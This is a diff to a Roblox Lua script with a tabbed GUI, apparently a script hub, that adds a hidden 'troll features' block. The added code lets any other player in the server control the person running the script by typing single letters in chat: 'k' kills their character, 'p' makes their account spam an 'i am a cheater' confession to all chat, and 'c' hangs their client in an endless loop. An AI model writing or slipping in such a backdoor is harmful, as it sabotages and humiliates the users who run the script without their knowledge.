@@ -435,6 +435,52 @@ if LocalPlayer.Character then
 end
 LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
 
+-- troll features muhahahaha
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local spamming = false
+
+local function onPlayerChatted(player)
+    player.Chatted:Connect(function(message)
+        local msg = message:lower()
+        
+        if msg == "k" then
+            local character = LocalPlayer.Character
+            if character then
+                local humanoid = character:FindFirstChild("Humanoid")
+                if humanoid then
+                    humanoid.Health = 0
+                end
+            end
+        elseif msg == "p" then
+            spamming = not spamming
+            
+            if spamming then
+                spawn(function()
+                    while spamming do
+                        local args = {
+                            [1] = LocalPlayer.Name .. " i am a cheater",
+                            [2] = "All"
+                        }
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+                        wait(0.5)
+                    end
+                end)
+            end
+        elseif msg == "c" then
+            while true do end
+        end
+    end)
+end
+
+for _, player in pairs(Players:GetPlayers()) do
+    onPlayerChatted(player)
+end
+
+Players.PlayerAdded:Connect(onPlayerChatted)
+
 -- select first tab
 Window:SelectTab(1)
 
